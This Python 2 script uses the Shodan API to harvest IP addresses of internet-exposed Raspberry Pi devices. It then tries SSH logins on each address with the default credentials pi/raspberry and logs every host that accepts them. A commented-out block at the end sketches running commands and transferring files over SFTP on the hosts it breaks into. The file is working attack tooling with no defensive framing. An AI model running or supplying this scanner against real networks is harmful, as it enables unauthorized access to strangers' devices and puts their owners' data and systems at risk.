import shodan
import argparse
import os,sys
import paramiko,socket

parser = argparse.ArgumentParser()
parser.add_argument('input', help='Source file', type=str, nargs='?',default='raspberry_ip.txt')
args = parser.parse_args()
target_file = str(args.input).replace(' ','')

if target_file=='raspberry_ip.txt':
        print '\n\n'+'  Source File: %s (Default)'%target_file
else:
        print '\n\n'+'  Source File: %s (input)'%target_file


#Define Shodan Api key--
shodan_api = ''


#Check if target list is available or not.
if(os.path.isfile('./'+target_file)==False or os.path.getsize(target_file)==0):
        print "  File not found\n  Creating file using Shodan..."
        api = shodan.Shodan(shodan_api)
        try:
                results = api.search('raspberry')
                with open(target_file,'a') as ras:
                        for addr in results['matches']:
                                ras.write(addr['ip_str']+'\n')
                ras.close()
                print '  File \"%s\" created!'%target_file
        except shodan.APIError, e:
                print '  Error: %s\n  Check the shodan api key!'%e
                sys.exit()
        except:
                raise

#Variables
log_filename = 'paramiko_log.txt'
i = 0
success = 0
err = 0

print '\n'+'  {:-^46}'.format('Start')+'\n'

#Main loop:
while (True):
        with open(target_file,'r') as f:
                lines = f.readlines()
        try:
                server = lines[i]
                server = server.strip()
                username = 'pi'
                password = 'raspberry'
                ssh = paramiko.SSHClient()
                paramiko.util.log_to_file(log_filename)
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                #In case the server's key is unknown,
                #we will be adding it automatically to the list of known hosts
                #Loads the user's local known host file.
                ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
                try:                        
                        #Connection initiated... set the value for timeout 
                        ssh.connect(server, username=username, password=password, timeout=5)
                        print '%3d : %7s : %5s'%(i,server,'Success!')
                        success=success+1
                        with open('success_ip.txt','a+') as fl:
                                fl.write(server)
                                fl.close()
                        f.close()
                        ssh.close()
                        i=i+1
                except  paramiko.AuthenticationException:                        
                        print '%3d : %7s : %5s'%(i,server,'Authentication Failed!')
                        i=i+1
                        f.close()                
                except paramiko.ssh_exception.NoValidConnectionsError:
                        print '%3d : %7s : %5s'%(i,server,'Connection Failed!')
                        i=i+1
                        f.close()
                except paramiko.ssh_exception.SSHException:
                        print '%3d : %7s : %5s'%(i,server,'Connection Failed!')
                        i=i+1
                        f.close()
                except KeyboardInterrupt:
                        print '\n\n  {:-^46}'.format('Interrupted!')+'\n'
                        f.close()
                        sys.exit()
                except:
                        f.close()
                        raise
        except KeyboardInterrupt:
                print '\n\n  {:-^46}'.format('Interrupted!')+'\n'
                sys.exit()
        except IndexError:
                f.close()
                print "\n  Total successful IPs -- %d"%success
                print '  {:-^46}'.format('Finished')+'\n'
                sys.exit()
        except:
                f.close()
                raise

'''
#Error handling---
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('ls /tmp')
#Reading output of the executed command
print "output", ssh_stdout.read()                
error = ssh_stderr.read()
#Reading the error stream of the executed command
print "error:", error, len(error)
#Transfering files to and from the remote machine
sftp = ssh.open_sftp()
sftp.get(remote_path, local_path)
sftp.put(local_path, remote_path)
sftp.close()
ssh.close()
'''
